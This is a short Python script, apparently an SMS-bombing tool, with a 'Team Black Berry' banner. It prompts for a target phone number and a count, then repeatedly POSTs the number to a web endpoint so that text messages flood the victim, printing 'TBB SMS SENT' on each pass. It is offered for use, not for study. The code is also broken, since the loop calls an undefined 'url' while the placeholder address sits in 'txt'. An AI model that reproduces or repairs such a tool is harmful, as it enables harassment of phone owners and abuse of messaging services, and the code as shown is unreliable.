import requests
from requests.structures import CaseInsensitiveDict
print("\033[H\033[J")
print("""
 T_B_B
 TÊÃM BLÅÇK BËRRY
  Created by: ÅSB ÃSHÏS BÎSWÅS
  TBB C_O
  
  
  
  Creator: Asb Ashis Biswas
  Facebook : https://www.facebook.com/profile.php?id=100074238783251
  CO: Team Black Berry
  
  """)                                                        
number=str(input("Enter Terget Number: "))
amount=int(input("Enter Terget Amount: "))
txt = "https://hacker.com/becareful/tatget"

headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/x-www-form-urlencoded"

data = "phone="+number


for j in range(amount):
    resp = requests.post(url, headers=headers, data=data)
    print(str(j+1)+"TBB SMS SENT")
